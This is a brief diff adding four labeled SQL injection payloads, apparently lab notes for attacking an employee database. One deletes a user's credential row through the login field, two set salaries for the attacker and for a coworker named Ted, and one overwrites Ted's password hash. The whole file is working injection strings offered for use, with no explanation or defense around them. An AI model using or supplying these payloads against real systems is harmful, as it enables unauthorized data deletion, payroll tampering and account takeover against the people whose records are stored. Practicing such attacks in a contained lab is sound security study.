@@ -1,0 +1,4 @@
+delete try from login - '1=1;Delete From credential where name='Ted';#
+update from profile - ',salary=500000 where EID=10000;#
+change coworker salary - ',salary=9 where name='Ted';#
+change pass - ',password='e48eceddcaadf5e4e11008ddbb2b41a372709d20' Where name='Ted';#
